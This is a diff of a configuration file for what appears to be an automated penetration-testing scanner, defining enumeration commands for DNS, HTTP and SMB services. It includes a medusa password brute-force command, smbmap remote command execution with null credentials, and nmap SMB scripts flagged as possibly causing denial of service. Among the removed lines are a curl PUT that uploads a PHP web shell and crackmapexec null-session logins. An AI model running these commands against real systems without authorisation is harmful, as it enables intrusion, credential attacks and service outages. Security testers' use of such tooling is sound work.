@@ -52,16 +52,6 @@ service-names = [
     name = 'nmap-dns'
     command = 'nmap {nmap_extra} -sV -p {port} --script="banner,(dns* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "{scandir}/{protocol}_{port}_dns_nmap.txt" -oX "{scandir}/xml/{protocol}_{port}_dns_nmap.xml" {address}'
 
-    [[dns.manual]]
-    description = 'Perform DNS enumeration after identifying name for the target:'
-    commands = [
-        'dnsrecon -a -g -b -k -w -z --threads 10 --xml {scandir}/xml/dnsrecon.xml -t std, -d hostname | tee "{scandir}/dnsrecon.txt',
-        'dnsrecon -a -t std google._domainkey.hostname | tee "{scandir}/dnsrecon.google._domainkey.txt"',
-        'dnsrecon -a -t std dkim._domainkey.hostname | tee "{scandir}/dnsrecon.dkim._domainkey.txt"',
-        'dnsrecon -a -t std default._domainkey.hostname | tee "{scandir}/dnsrecon.default._domainkey.txt"',
-        'dnsrecon -a -t std _dkim.hostname | tee "{scandir}/dnsrecon._dkim.txt"'
-    ]
-
 [finger]
 
 service-names = [
@@ -118,46 +108,7 @@ ignore-service-names = [
 
     [[http.scan]]
     name = 'curl-index'
-    command = 'curl -sSik {scheme}://{address}:{port}/ -m 10 2>&1 | tee "{scandir}/{protocol}_{port}_{scheme}_home.any.html"'
-
-        [[http.scan.pattern]]
-        pattern = '(?i)Powered by [^\n]+'
-
-    [[http.scan]]
-    name = 'wkhtmltoimage'
-    command = 'if hash wkhtmltoimage 2> /dev/null; then wkhtmltoimage --format png {scheme}://{address}:{port}/ {scandir}/{protocol}_{port}_{scheme}_screenshot.home.any.png; fi'
-
-    [[http.scan]]
-    name = 'curl-index'
-    command = 'curl -sSik {scheme}://{address}:{port}/index.html -m 10 2>&1 | tee "{scandir}/{protocol}_{port}_{scheme}_index.html"'
-
-        [[http.scan.pattern]]
-        pattern = '(?i)Powered by [^\n]+'
-
-    [[http.scan]]
-    name = 'curl-index'
-    command = 'curl -sSik {scheme}://{address}:{port}/index.php -m 10 2>&1 | tee "{scandir}/{protocol}_{port}_{scheme}_index.php.html"'
-
-        [[http.scan.pattern]]
-        pattern = '(?i)Powered by [^\n]+'
-
-    [[http.scan]]
-    name = 'curl-index'
-    command = 'curl -sSik {scheme}://{address}:{port}/index.asp -m 10 2>&1 | tee "{scandir}/{protocol}_{port}_{scheme}_index.asp.html"'
-
-        [[http.scan.pattern]]
-        pattern = '(?i)Powered by [^\n]+'
-
-    [[http.scan]]
-    name = 'curl-index'
-    command = 'curl -sSik {scheme}://{address}:{port}/index.aspx -m 10 2>&1 | tee "{scandir}/{protocol}_{port}_{scheme}_index.aspx.html"'
-
-        [[http.scan.pattern]]
-        pattern = '(?i)Powered by [^\n]+'
-
-    [[http.scan]]
-    name = 'curl-index'
-    command = 'curl -sSik {scheme}://{address}:{port}/index.jsp -m 10 2>&1 | tee "{scandir}/{protocol}_{port}_{scheme}_index.jsp.html"'
+    command = 'curl -sSik {scheme}://{address}:{port}/ -m 10 2>&1 | tee "{scandir}/{protocol}_{port}_{scheme}_index.html"'
 
         [[http.scan.pattern]]
         pattern = '(?i)Powered by [^\n]+'
@@ -167,8 +118,8 @@ ignore-service-names = [
     command = 'curl -sSik {scheme}://{address}:{port}/robots.txt -m 10 2>&1 | tee "{scandir}/{protocol}_{port}_{scheme}_robots.txt"'
 
     [[http.scan]]
-    name = 'curl-humans'
-    command = 'curl -sSik {scheme}://{address}:{port}/humans.txt -m 10 2>&1 | tee "{scandir}/{protocol}_{port}_{scheme}_humans.txt"'
+    name = 'wkhtmltoimage'
+    command = 'if hash wkhtmltoimage 2> /dev/null; then wkhtmltoimage --format png {scheme}://{address}:{port}/ {scandir}/{protocol}_{port}_{scheme}_screenshot.png; fi'
 
     [[http.scan]]
     name = 'whatweb'
@@ -177,10 +128,6 @@ ignore-service-names = [
     [[http.scan]]
     name = 'nikto'
     command = 'nikto -ask=no -h {scheme}://{address}:{port} 2>&1 | tee "{scandir}/{protocol}_{port}_{scheme}_nikto.txt"'
-
-    [[http.scan]]
-    name = 'dirb'
-    command = 'dirb {scheme}://{address}:{port}/ /usr/share/seclists/Discovery/Web-Content/common.txt -l -r -S -X ",.txt,.html,.php,.asp,.aspx,.jsp" -o "{scandir}/{protocol}_{port}_{scheme}_dirb.txt"'
 
     [[http.scan]]
     name = 'gobuster'
@@ -229,11 +176,6 @@ ignore-service-names = [
         'medusa -U "{username_wordlist}" -P "{password_wordlist}" -e ns -n {port} -O "{scandir}/{protocol}_{port}_{scheme}_form_medusa.txt" -M web-form -h {address} -m FORM:/path/to/login.php -m FORM-DATA:"post?username=&password=" -m DENY-SIGNAL:"invalid login message"',
     ]
 
-# "curl -v -X OPTIONS http://<target>:<port>/<directory>",
-#    "curl -v -X PUT -d '<?php echo shell_exec($_GET[\"cmd\"]);?>' http://<target>:<port>/<directory>/webshell.php",
-#    "dirb http://<target>:<port>/",
-#    "dotdotpwn -m http -h <target> -x <port> -f <pathtoretrieve> -k <keywordthatmustbepresent> -d <depth> -t <millisperrequest> -s",
-#    "wafw00f http://<target>:/<port>/",
 [imap]
 
 service-names = [
@@ -489,14 +431,14 @@ service-names = [
 
     [[smb.scan]]
     name = 'enum4linux'
-    command = 'enum4linux -a -M -l -d {address} 2>&1 | tee "{scandir}/smb_enum4linux.txt"'
+    command = 'enum4linux -a -M -l -d {address} 2>&1 | tee "{scandir}/enum4linux.txt"'
     run_once = true
     ports.tcp = [139, 389, 445]
     ports.udp = [137]
 
     [[smb.scan]]
     name = 'nbtscan'
-    command = 'nbtscan -rvh {address} 2>&1 | tee "{scandir}/smb_nbtscan.txt"'
+    command = 'nbtscan -rvh {address} 2>&1 | tee "{scandir}/nbtscan.txt"'
     run_once = true
     ports.udp = [137]
 
@@ -518,10 +460,6 @@ service-names = [
     name = 'smbmap-execute-command'
     command = 'smbmap -H {address} -P {port} -x "ipconfig /all" 2>&1 | tee -a "{scandir}/smbmap-execute-command.txt"; smbmap -u null -p "" -H {address} -P {port} -x "ipconfig /all" 2>&1 | tee -a "{scandir}/smbmap-execute-command.txt"'
 
-    [[smb.scan]]
-    name = 'smbmap-execute-command'
-    command = 'python2 /usr/share/doc/python-impacket/examples/samrdump.py {address} {port}/SMB | tee "{basedir}/smb_samrdump.txt"'
-
     [[smb.manual]]
     description = 'Nmap scans for SMB vulnerabilities that could potentially cause a DoS if scanned (according to Nmap). Be careful:'
     commands = [
@@ -530,9 +468,6 @@ service-names = [
         'nmap {nmap_extra} -sV -p {port} --script="smb-vuln-ms08-067" --script-args="unsafe=1" -oN "{scandir}/{protocol}_{port}_smb_ms08-067.txt" -oX "{scandir}/xml/{protocol}_{port}_smb_ms08-067.xml" {address}'
     ]
 
-#    "crackmapexec smb <target> -u <user> -p <pass> --spider C\\$ --pattern <pattern>",
-#    "crackmapexec smb <target> -u '' -p ''",
-#    "crackmapexec smb <target> -u '' -p '' --local-auth",
 [smtp]
 
 service-names = [
